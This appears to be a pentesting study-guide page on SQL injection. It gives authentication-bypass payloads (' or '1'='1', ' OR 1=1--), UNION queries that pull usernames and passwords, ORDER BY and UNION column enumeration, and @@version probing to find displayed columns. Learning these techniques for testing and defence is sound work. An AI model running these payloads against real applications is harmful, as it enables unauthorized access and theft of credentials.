---
icon: syringe
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# SQL Injection

An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input.

## Logical Operators

### ' or '1'='1'

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' AND password = 'password';
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' or '1'='1' AND password = 'password';
```
{% endcode %}

{% hint style="warning" %}
This example requires a username to be known and correct.
{% endhint %}

### ' or '1' = '1 x2

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin' AND password = 'password';
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='' or '1'='1' AND password = '' or '1' = '1;
```
{% endcode %}

## Comments

### '--&#x20;

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
{% endcode %}

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password = 'something';
```
{% endcode %}

{% hint style="warning" %}
This example requires a username to be known and correct.
{% endhint %}

### ' OR 1=1--

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'password'
```
{% endcode %}

## UNION Clause

The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. Let us try using the `UNION` operator in a sample database.

{% hint style="warning" %}
## Equal Columns

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

{% code overflow="wrap" %}
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
{% endcode %}
{% endhint %}

### Basic UNION

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
{% endcode %}

### Uneven UNION

In the below example, the data '2' is used to "balance" the UNION. This is because the 'products' table has more columns than the number of columns the injected query is returning.

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
{% endcode %}

{% hint style="warning" %}
## Data Types

When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
{% endhint %}

{% hint style="success" %}
## NULL Type Tip

For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
{% endhint %}

## UNION Injection



## Column Enumeration

To find the number of columns selected by the server. There are two methods of detecting the number of columns:

* Using `ORDER BY`
* Using `UNION`

### ORDER BY

To find the count of columns for a table inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

Start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column.Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns. If it fails at `order by 4`, this means the table has three columns.

```sql
' order by 1-- 
```

{% hint style="info" %}
Ensure that the white-space ' ' at the end of the comment is included.
{% endhint %}

### UNION

The 'ORDER BY' method always returns the results until we hit an error, while this method always gives an error until we get a success.

Injecting a 3 column `UNION` query:

```sql
' UNION select 1,2,3-- 
```

## Injection Location

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection.

It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them.

The injection cannot be placed at the beginning, or its output will not be printed.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:

```sql
' UNION select 1,@@version,3,4-- 
```

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page.

## User Enumeration



